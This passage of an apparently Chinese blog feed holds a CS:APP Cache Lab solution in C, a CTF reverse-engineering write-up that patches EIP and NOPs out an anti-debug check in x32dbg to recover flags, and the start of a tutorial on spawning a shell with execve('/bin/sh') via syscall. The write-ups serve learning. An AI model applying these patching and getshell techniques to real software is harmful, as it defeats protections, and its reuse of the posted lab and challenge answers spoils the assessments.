class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CACHELAB_TOOLS_H */</span></span></span><br></pre></td></tr></table></figure><p>用我那-4级的英语水平来翻译大概就是定义了一个结构体，结构体里有测试<code>cache</code>的一些指标，诸如命中次数这些的东西，所以这个结构体就当成<code>cache</code>吧。</p><p>那么就很好写(chao)<code>csim.c</code>的代码了，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="keyword">int</span> help_mode, verbose_mode, s, E, b, S,number_hits, number_miss, number_eviction;</span><br><span class="line"><span class="comment">//S is the number of sets, E is the associativity, b is number of block bits</span></span><br><span class="line"><span class="keyword">char</span> filename[<span class="number">1000</span>];<span class="comment">//The file name</span></span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">1000</span>];<span class="comment">//The buffer of input</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> valid_bit, tag, stamp;<span class="comment">//cold miss</span></span><br><span class="line">&#125;cache_line;</span><br><span class="line">cache_line **cache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> max_stamp = INT_MIN, max_stamp_id = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span>  t_address, s_address;<span class="comment">// The t value and s value of address</span></span><br><span class="line">s_address = (address &gt;&gt; b) &amp; ((<span class="number">-1U</span>) &gt;&gt; (<span class="number">32</span> - s));<span class="comment">//use bit manipulation to get s_address, -1U equals to INT_MAX</span></span><br><span class="line">t_address = address &gt;&gt; (s + b);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)<span class="comment">//check whether there is a hit</span></span><br><span class="line"><span class="keyword">if</span>(cache[s_address][i].tag == t_address)<span class="comment">//which means a hit</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//is_placed = 1;</span></span><br><span class="line">cache[s_address][i].stamp = <span class="number">0</span>;<span class="comment">//restart the time stamp control unit</span></span><br><span class="line">number_hits++;</span><br><span class="line"><span class="comment">//printf(&quot;hit\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> ;<span class="comment">//just return now</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//to check whether is an empty line</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line"><span class="keyword">if</span>(cache[s_address][i].valid_bit == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">cache[s_address][i].valid_bit = <span class="number">1</span>;</span><br><span class="line">cache[s_address][i].tag = t_address;</span><br><span class="line">cache[s_address][i].stamp = <span class="number">0</span>;</span><br><span class="line">number_miss++;<span class="comment">//compulsory miss</span></span><br><span class="line"><span class="comment">//printf(&quot;miss\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//If there is not any empty line, then an eviction will occur</span></span><br><span class="line">number_eviction++;</span><br><span class="line">number_miss++;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line"><span class="keyword">if</span>(cache[s_address][i].stamp &gt; max_stamp)</span><br><span class="line">&#123;</span><br><span class="line">max_stamp = cache[s_address][i].stamp;</span><br><span class="line">max_stamp_id = i;</span><br><span class="line">&#125;</span><br><span class="line">cache[s_address][max_stamp_id].tag = t_address;</span><br><span class="line">cache[s_address][max_stamp_id].stamp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_time</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">//update the time stamp of each cache line</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line"><span class="keyword">if</span>(cache[i][j].valid_bit == <span class="number">1</span>)<span class="comment">//if valid</span></span><br><span class="line">cache[i][j].stamp++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> opt, temp;<span class="comment">//The getopt return value</span></span><br><span class="line"><span class="keyword">char</span> type;<span class="comment">//type of a single trace record</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> address;<span class="comment">//address of memory</span></span><br><span class="line">number_hits = number_miss = number_eviction = <span class="number">0</span>;<span class="comment">//initialization</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">-1</span> != (opt = (getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>))))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span>(opt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:help_mode = <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:verbose_mode = <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:s = atoi(optarg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:E = atoi(optarg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:b = atoi(optarg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:<span class="built_in">strcpy</span>(filename, optarg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(help_mode == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cat help_info&quot;</span>);<span class="comment">//&quot;help_info&quot; is a text file containing help information</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">FILE* fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(fp == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;The File is wrong!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">S = (<span class="number">1</span> &lt;&lt; s); <span class="comment">// S equals to 2^s</span></span><br><span class="line">cache = (cache_line**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line*) * S);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">cache[i] = (cache_line*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);<span class="comment">//Important! malloc each row of cache</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">&#123;</span><br><span class="line">cache[i][j].valid_bit = <span class="number">0</span>;</span><br><span class="line">cache[i][j].tag = cache[i][j].stamp = <span class="number">-1</span>;</span><br><span class="line">&#125;<span class="comment">//initialization</span></span><br><span class="line"><span class="keyword">while</span>(fgets(buffer,<span class="number">1000</span>,fp))<span class="comment">//get a whole line</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sscanf</span>(buffer,<span class="string">&quot; %c %xu,%d&quot;</span>, &amp;type, &amp;address, &amp;temp);<span class="comment">//hexdecimal</span></span><br><span class="line"><span class="keyword">switch</span>(type)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:update(address);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:update(address);<span class="comment">//just let it fall through, do twice</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:update(address);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">update_time();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line"><span class="built_in">free</span>(cache[i]);<span class="comment">//free allocated space first</span></span><br><span class="line"><span class="built_in">free</span>(cache);</span><br><span class="line">fclose(fp);</span><br><span class="line">printSummary(number_hits, number_miss, number_eviction);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试：</p><p><img src="https://i.loli.net/2021/05/23/qTi9oVAtbpeRYnk.png" alt="Cachelab_PartA_1.png"></p><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p>优化矩阵转置函数，使得cache miss尽可能少,不超过12个临时变量</p><h3 id="32-x-32"><a href="#32-x-32" class="headerlink" title="32 x 32"></a>32 x 32</h3><p>直接转置是肯定不行的，这都不用去试(实则败而归来)。众所周知，分块是一个很好用的算法</p><p>32位字节的数据，一个int4字节，每行/列有8个int，我们将其分块为8x8，进行处理</p><p>充分利用这些变量即可写出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(M == <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, k, v1, v2, v3, v4, v5, v6, v7, v8;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span>(k = i; k &lt; (i + <span class="number">8</span>); ++k)</span><br><span class="line">&#123;</span><br><span class="line">v1 = A[k][j];</span><br><span class="line">v2 = A[k][j+<span class="number">1</span>];</span><br><span class="line">v3 = A[k][j+<span class="number">2</span>];</span><br><span class="line">v4 = A[k][j+<span class="number">3</span>];</span><br><span class="line">v5 = A[k][j+<span class="number">4</span>];</span><br><span class="line">v6 = A[k][j+<span class="number">5</span>];</span><br><span class="line">v7 = A[k][j+<span class="number">6</span>];</span><br><span class="line">v8 = A[k][j+<span class="number">7</span>];</span><br><span class="line">B[j][k] = v1;</span><br><span class="line">B[j+<span class="number">1</span>][k] = v2;</span><br><span class="line">B[j+<span class="number">2</span>][k] = v3;</span><br><span class="line">B[j+<span class="number">3</span>][k] = v4;</span><br><span class="line">B[j+<span class="number">4</span>][k] = v5;</span><br><span class="line">B[j+<span class="number">5</span>][k] = v6;</span><br><span class="line">B[j+<span class="number">6</span>][k] = v7;</span><br><span class="line">B[j+<span class="number">7</span>][k] = v8;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个暂时先立个flag在这里，等之后会做了再做吧，后面的真的做的不太行了。。。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;lab&lt;/code&gt;从这里开始变得难了起来了，这次要模拟计算机里的一个硬件-&lt;code&gt;cache&lt;/code&gt;的工作，关于&lt;code&gt;cache&lt;/code&gt;，百度百科介绍的比我好，这边请&lt;a href=&quot;https://baike.baidu.com/item/CACHE%E5%AD%98%E5%82%A8%E5%99%A8/12789048?fr=aladdin&quot;&gt;———&amp;gt;&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="csapp" scheme="http://example.com/categories/csapp/"/>
    
    <category term="lab" scheme="http://example.com/categories/csapp/lab/"/>
    
    
  </entry>
  
  <entry>
    <title>动态调试工具的使用</title>
    <link href="http://example.com/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
    <id>http://example.com/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</id>
    <published>2021-05-22T02:00:00.000Z</published>
    <updated>2021-10-25T04:38:33.709Z</updated>
    
    <content type="html"><![CDATA[<p>做了这么久的<code>pwn</code>之后又得兼顾一下<code>re</code>了哈哈哈。废话不多说，这周学了动态调试器的使用，并且轻松解出了那几道题目。</p><span id="more"></span><p><code>linux</code>下的动态调试器都知道，<code>gdb</code>永远的神，<code>windows</code>的动态调试器就比较各色了，<code>ollydbg</code>，<code>x32dbg</code>，<code>x64dbg</code>。这里我用的是后两个调试器，<code>ollydbg</code>听师傅们说是不更新了还是咋地也不知道，所以就用了x32和<code>x64dbg</code>，其实看了一下界面都差不多的。</p><p>动态调试注意的就是下断点，改值这一系列操作，让程序按照你想的执行。比如有一个函数就是直接输出<code>flag</code>，但是它直接又没有完全直接给你，那怎么办？我直接改<code>eip</code>去执行那个函数不就ok了？与<code>pwn</code>不一样，<code>pwn</code>我要通过漏洞去执行，这个的话文件控制权限和这台计算机的权限全部在我手上，它怎么运行我说的算，对不对？那么接下来看几道例题，这个不是说只有动调能做，但是会动调一定比不会的占优势，这是真的。</p><h2 id="xctf-game"><a href="#xctf-game" class="headerlink" title="xctf-game"></a><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5074&page=1">xctf-game</a></h2><p>下载文件并且根据它的描述可以看到是一个32位PE文件且是一个类似游戏的程序，逻辑很简单，输入序列然后通过它函数的判断就可以让程序输出<code>flag</code>。但是</p><p><img src="https://i.loli.net/2021/05/22/ufkspBM3bHW1VgN.png" alt="xctf_game_1.png"></p><p>这个函数不仅复杂，直接从这里破解可以但是比较难，要从外面实现又比较苛刻那么此时我们开启动调然后直接改eip执行这个函数。</p><p>x32dbg打开查看内存映射，发现textbss的基址是0x101000</p><p><img src="https://i.loli.net/2021/05/22/ezy8HXpV3x7nGq4.png" alt="xctf_game_2.png"></p><p>而在IDA里，此段的基址是<code>0x401000</code></p><p>很清楚了，他们之间偏移了<code>0x300000</code>的地址大小，在IDA里面的所有地址减去<code>0x300000</code>就可以得到在<code>x32dbg</code>里的对应地址。然后注意改<code>eip</code>遵循的原则应该是首先保证栈尽量平衡，并且修改的幅度尽量不大。根据这个原则以及<code>x32dbg</code>给我们程序一开始的断点。</p><p><img src="https://i.loli.net/2021/05/22/jwtIs7krZgyilfN.png" alt="xctf_game_3.png"></p><p>我们把栈顶的值修改成我们要跳转的地方，并且将<code>eip</code>向下调3个语句之后就能直接执行输出<code>flag</code>的语句而不用玩它设计的破游戏了。首先那个函数在IDA里面的地址是<code>0x457ab4</code>，那么在<code>x32dbg</code>里面这个地址就是<code>0x157ab4</code>。我们先把栈顶修改成这个，再把<code>eip</code>改成 <code>0x77661b78</code></p><p><img src="https://i.loli.net/2021/05/22/TicptYsPE9XRSl7.png" alt="xctf_game_4.png"></p><p>这里需要注意的是，由于我们破坏了它的栈，因此尽量避免去执行那些函数，遇到尽量跳过。</p><p><img src="https://i.loli.net/2021/05/22/wPlNWzIcQ7YsGxi.png" alt="xctf_game_5.png"></p><p>这里我们不选择执行<code>printf</code>函数，因为试过就知道由于之前破坏了栈帧会导致不可预估的错误发生，正确做法就是把<code>eip</code>改到<code>call</code>那个之后。</p><p>其实直接改<code>eip</code>也一样的，我那种只是改的其中一种方式。</p><p>然后下面还有一个<code>prinf</code>函数我们也选择不执行，在<code>printf</code>之前下个断点然后F9运行你就可以看到<code>flag</code>了。</p><p><img src="https://i.loli.net/2021/05/23/j9QYM6TUN3KeGuo.png" alt="xctf_game_6.png"></p><p>然后返回游戏一看，啥也没有，但是我已经知道了<code>flag</code>，hhh。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">flag:zsctf&#123;T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t&#125;</span><br></pre></td></tr></table></figure><h2 id="xctf-csaw2013reversing2"><a href="#xctf-csaw2013reversing2" class="headerlink" title="xctf-csaw2013reversing2"></a><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5081&page=1">xctf-csaw2013reversing2</a></h2><p>题目已经说了运行就可以拿<code>flag</code>，但是运行发现弹出来的窗口是乱码，IDA反汇编并且反编译之后检查<code>main</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line"></span><br><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ecx</span><br><span class="line">  CHAR *lpMem; // [esp+8h] [ebp-Ch]</span><br><span class="line">  HANDLE hHeap; // [esp+10h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  hHeap = HeapCreate(0x40000u, 0, 0);</span><br><span class="line">  lpMem = (CHAR *)HeapAlloc(hHeap, 8u, SourceSize + 1);</span><br><span class="line">  memcpy_s(lpMem, SourceSize, &amp;unk_409B10, SourceSize);</span><br><span class="line">  if ( !sub_40102A() &amp;&amp; !IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBoxA(0, lpMem + 1, &quot;Flag&quot;, 2u);</span><br><span class="line">    HeapFree(hHeap, 0, lpMem);</span><br><span class="line">    HeapDestroy(hHeap);</span><br><span class="line">    ExitProcess(0);</span><br><span class="line">  &#125;</span><br><span class="line">  __debugbreak();</span><br><span class="line">  sub_401000(v3 + 4, lpMem);</span><br><span class="line">  ExitProcess(0xFFFFFFFF);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也太狗了，还会检测在不在调试器中，在的话我还索性不输出了？</p><p>跟进去<code>0x41000</code>函数去看发现有对<code>msgbox</code>输出的<code>flag</code>做了点手脚，那么就猜测可能这个部分是用来算正确的<code>flag</code>的，那么我们的顺序应该是先执行那个函数再输出<code>flag</code>才对。所以一开始我们改<code>eip</code>执行<code>0x41000</code>函数。</p><p>直接改了<code>eip</code>发现并不好使，那么我们就要再<code>main</code>函数里面直接调用<code>main</code>函数的代码了。发现还是不行之后，发现<code>int3</code>指令一直再阻挡，因此把这个指令<code>nop</code>掉。发现可以直接执行那个函数，执行完了之后发现还是要退出程序，那么我们就得寻找输出这个<code>flag</code>的函数，为什么我们不能像上面那个题那样，直接能看到变量的值？</p><p>问得好，我也不知道qwq，只能在线寻师傅解决这个疑问了。</p><p><img src="https://i.loli.net/2021/05/23/8C1M7fQv6yUPJwt.png" alt="xctf_csaw2013reversing2_1.png"></p><p>可以看到这边又两个调用messagebox函数，那么到底选择哪一个，回头看代码里就会发现咱们的messagebox传了四个参数，那么对比一下发现下面的messagebox才是传了四个参数的函数调用，那么我们把eip改到传参那边，运行执行跳出消息框得到flag</p><p><img src="https://i.loli.net/2021/05/23/uRpS1YtevmHThi8.png" alt="xctf_csaw2013reversing2_2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">flag：flag&#123;reversing_is_not_that_hard!&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;做了这么久的&lt;code&gt;pwn&lt;/code&gt;之后又得兼顾一下&lt;code&gt;re&lt;/code&gt;了哈哈哈。废话不多说，这周学了动态调试器的使用，并且轻松解出了那几道题目。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
  <entry>
    <title>系统调用</title>
    <link href="http://example.com/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-05-22T02:00:00.000Z</published>
    <updated>2021-10-25T04:42:29.725Z</updated>
    
    <content type="html"><![CDATA[<p><code>today</code>新的知识又增长了，发现了<code>getshell</code>的另一种方式：<code>syscall</code>和<code>srop</code>。故事还要源于…(此处省略万字输出)</p><span id="more"></span><p>(note:本作者这次有点懒，没有写AT&amp;T汇编，而是一律用了intel汇编，请悉知)</p><p>可能是之前汇编基础不太好吧，竟没有发现<code>syscall</code>这么好用的指令，只要再把<code>/bin/sh</code>传参就能直接打开一个shell，真是妙蛙。但是在系统调用之前要做很多的事情，诸如各类参数传递，以64位的来说，我们要先知道我们要执行的函数系统调用号为59。我也是翻过<code>libc</code>库的，发现<code>system</code>函数实现里面有一段竟然是直接执行<code>execve(&quot;/bin/sh&quot;)</code></p><p><img src="https://i.loli.net/2021/05/25/dSTQLa938pI7yWF.png" alt="syscall_1.png"></p><p>实属意外了，这是在我有次反汇编<code>libc</code>库的时候发现的，我原来一直是只用<code>system</code>函数<code>getshell</code>的，没想到<code>system</code>内部是通过这样的系统调用来打开<code>shell</code>的。</p><p>那这得学啊，这是基础的基础啊。</p><p>这边给出一下64位Linux的各个系统调用号，这个在Linux的<code>/usr/include/asm/unistd.h </code>下有，我这里截取部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk 12</span></span><br><span 